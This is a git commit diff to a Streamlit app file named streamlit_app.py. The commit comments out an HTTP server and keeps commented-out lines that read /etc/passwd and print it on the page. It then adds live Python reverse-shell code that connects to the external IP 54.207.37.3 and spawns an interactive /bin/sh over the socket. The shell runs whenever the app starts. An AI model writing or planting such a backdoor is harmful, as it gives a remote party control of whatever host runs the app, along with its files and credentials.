0a56c650e7e59baef1eb172f5d3971cfcd97708e
sql3t0 <dj.sqleto@gmail.com>
2025-02-11 14:26:17 +0000

    teste http.server

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,9 +1,9 @@
 import streamlit as st
-from http.server import HTTPServer, SimpleHTTPRequestHandler
-st.title("🎈 My new app")
+# from http.server import HTTPServer, SimpleHTTPRequestHandler
+# st.title("🎈 My new app")
 
-httpd = HTTPServer(('localhost', 8501), SimpleHTTPRequestHandler)
-httpd.serve_forever()
+# httpd = HTTPServer(('localhost', 8501), SimpleHTTPRequestHandler)
+# httpd.serve_forever()
 
 # filec = open('/etc/passwd').read()
 # #print(filec)
@@ -14,3 +14,7 @@ httpd.serve_forever()
 # st.write(
 #     f"{filec}"
 # )
+
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("54.207.37.3",12418));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
